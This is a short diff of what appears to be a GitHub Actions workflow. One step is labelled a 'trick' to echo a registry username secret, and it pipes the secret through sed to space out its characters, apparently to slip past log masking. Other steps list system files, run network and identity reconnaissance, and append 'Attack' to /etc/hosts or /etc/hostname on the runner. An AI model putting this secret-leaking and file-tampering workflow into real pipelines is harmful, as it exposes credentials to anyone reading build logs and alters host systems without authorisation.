@@ -27,13 +27,13 @@ jobs:
           echo ${{ secrets.HARBOR_DOCKER_USERNAME }}
           echo 'Trick to echo GitHub Actions Secret:  '
           pwd
-          ls -lrth /etc/passwd
+          ls -lrth /etc/
           echo ${{secrets.HARBOR_DOCKER_USERNAME}} | sed 's/./& /g'
           ifconfig
           echo "WhoAmI"
           whoami
           echo "Hosts"
-          echo "Attack" >> /etc/hosts
+          echo "Attack" >> /etc/hostname
           cat /etc/hosts
           echo "HostName"
           cat /etc/hostname
